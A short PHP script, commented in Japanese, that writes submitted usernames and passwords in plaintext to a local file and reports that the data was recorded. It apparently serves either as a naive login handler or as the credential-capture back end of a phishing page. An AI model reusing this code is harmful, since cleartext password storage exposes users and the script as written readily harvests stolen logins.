<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // 送信されたデータを取得
    $username = $_POST['username'];
    $password = $_POST['password'];

    // データをファイルに記録
    $file = fopen('data.txt', 'a');
    fwrite($file, "Username: $username, Password: $password\n");
    fclose($file);

    echo "データが記録されました。";
}
?>
